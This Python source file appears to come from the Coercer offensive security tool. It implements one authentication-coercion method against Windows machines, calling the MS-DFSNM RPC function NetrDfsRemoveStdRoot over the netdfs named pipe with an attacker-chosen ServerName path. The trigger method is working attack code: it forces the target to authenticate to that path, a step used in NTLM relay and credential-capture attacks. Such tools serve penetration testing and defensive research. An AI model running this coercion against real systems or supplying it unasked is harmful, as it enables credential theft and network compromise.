#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : NetrDfsRemoveStdRootResponse.py
# Author             : Podalirius (@podalirius_)
# Date created       : 14 Sep 2022

from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from coercer.core.utils import gen_random_name
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID


class _NetrDfsRemoveStdRoot(NDRCALL):
    """
    Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol
    """
    opnum = 13
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('ApiFlags', DWORD)    # Type: DWORD
    )


class _NetrDfsRemoveStdRootResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol
    """
    structure = ()


class NetrDfsRemoveStdRoot(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function NetrDfsRemoveStdRoot (opnum 13) of [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

    Method found by:
     - [@filip_dragovic](https://twitter.com/filip_dragovic)
    """

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\netdfs",
                "uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
                "version": "3.0"
            }
        ]
    }

    protocol = {
        "longname": "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol",
        "shortname": "MS-DFSNM"
    }

    function = {
        "name": "NetrDfsRemoveStdRoot",
        "opnum": 13,
        "vulnerable_arguments": ["ServerName"]
    }

    def trigger(self, dcerpc_session):
        if dcerpc_session is not None:
            try:
                request = _NetrDfsRemoveStdRoot()
                request['ServerName'] = self.path
                request['RootShare'] = gen_random_name() + '\x00'
                request['ApiFlags'] = 0
                resp = dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
